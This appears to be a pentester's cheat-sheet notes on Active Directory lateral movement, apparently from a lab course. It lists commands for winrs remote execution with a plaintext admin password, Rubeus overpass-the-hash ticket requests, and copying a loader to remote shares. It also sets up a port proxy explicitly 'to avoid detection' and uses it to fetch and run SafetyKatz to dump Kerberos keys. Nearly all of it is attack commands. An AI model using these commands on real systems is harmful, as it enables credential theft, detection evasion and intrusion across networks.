### **WINRS**
```powershell
winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
```
```powershell
winrs -r:<MACCHINA> cmd
```
### **OVERPASS THE HASH**
```powershell
rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```
```powershell
Rubeus.exe asktgt /user:svcadmin /aes256:<HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
### **Other Sessions Opened**
```powerview
Find-DomainUserLocation
```
![[Pasted image 20231018164427.png]]
Connect Using Win-rs
### **Copy from a machine to another**
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\<R MACHINE>\C$\Users\Public\Loader.exe
```

### **Avoid detection while downloading**
```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<IP>"
```
Download and use program
```powershell
$null | winrs -r:<MACCHINA> C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
```